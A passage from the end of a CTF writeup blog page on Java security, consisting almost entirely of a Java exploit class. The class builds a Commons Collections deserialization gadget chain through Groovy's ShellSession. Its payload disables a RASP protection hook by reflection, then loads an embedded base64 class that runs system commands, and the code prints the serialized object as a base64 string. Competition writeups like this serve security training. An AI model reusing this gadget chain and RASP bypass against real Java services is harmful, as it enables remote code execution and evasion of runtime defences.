</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w"></span><span class="c1">//        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{&#34;doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\&#34;com.rasp.hooks.RceHook\&#34;).getDeclaredField(\&#34;doRCEHook\&#34;);doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\&#34;calc\&#34;)&#34;}));</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w">        </span><span class="n">FactoryTransformer</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FactoryTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateFactory</span><span class="p">(</span><span class="n">ShellSession</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\&#34;com.rasp.hooks.RceHook\&#34;).getDeclaredField(\&#34;doRCEHook\&#34;);doRCEHook.setAccessible(true);doRCEHook.set(null, false);bytes = java.util.Base64.getDecoder().decode(\&#34;yv66vgAAADIAQAEAbm9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2Rlc2VyaWFsaXphdGlvbi9zdGQvU3RyaW5nQ29sbGVjdGlvbkRlc2VyaWFsaXplcjZmOWY0OWQ2MDM4MzQ3YmQ4MTJkY2ZkMTgwMGM4MDRlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEACDxjbGluaXQ+AQAEY2FsYwgAOwoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQA+AAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAPwAAABcABP8AIQABBwACAAAJZQcADPwAAAcABAAIADoACgABAD4AAAAaAAIAAAAAAA4SPLMAMLsAAlm3AD1XsQAAAAAAAA==\&#34;);systemClassLoader = ClassLoader.getSystemClassLoader();defineClass = java.lang.Class.forName(\&#34;java.lang.ClassLoader\&#34;).getDeclaredMethod(\&#34;defineClass\&#34;, java.lang.Class.forName(\&#34;java.lang.String\&#34;), java.lang.Class.forName(\&#34;[B\&#34;), java.lang.Integer.TYPE, java.lang.Integer.TYPE);defineClass.setAccessible(true);defineClass.invoke(systemClassLoader, \&#34;org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\&#34;,bytes,0, bytes.length);systemClassLoader.loadClass(\&#34;org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\&#34;).newInstance();&#34;</span><span class="p">}));</span><span class="w">
</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="w">        </span><span class="n">LinkedMap</span><span class="w"> </span><span class="n">linkedMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="w">        </span><span class="n">decoratemap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">decoratemap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">linkedMap2</span><span class="p">,</span><span class="w"> </span><span class="n">factoryTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="w">        </span><span class="n">decoratemap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;xrntkk2&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ObjectHashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="w">        </span><span class="n">ObjectHashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">decoratemap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xrntkk2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(linkedMap1.hashCode());</span><span class="w">
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(linkedMap1.hashCode());</span><span class="w">
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="w"></span><span class="c1">//        serialize(ObjectHashtable);</span><span class="w">
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="w"></span><span class="c1">//        unserialize();</span><span class="w">
</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serializeBase64</span><span class="p">(</span><span class="n">ObjectHashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serializeBase64</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">objectOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="w">        </span><span class="n">objectOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">61</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">64</span><span class="cl"><span class="w">        </span><span class="n">SecurityObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">66</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div>

  </div><footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
      <li><a href="http://localhost:1313/tags/javasec/">Javasec</a></li>
      <li><a href="http://localhost:1313/tags/java/">Java</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/java%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
    <span class="title">« 上一页</span>
    <br>
    <span>总结一下Java中的命令执行</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ycb2025-record/">
    <span class="title">下一页 »</span>
    <br>
    <span>羊城杯2025 金Java&amp;ezsigin Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
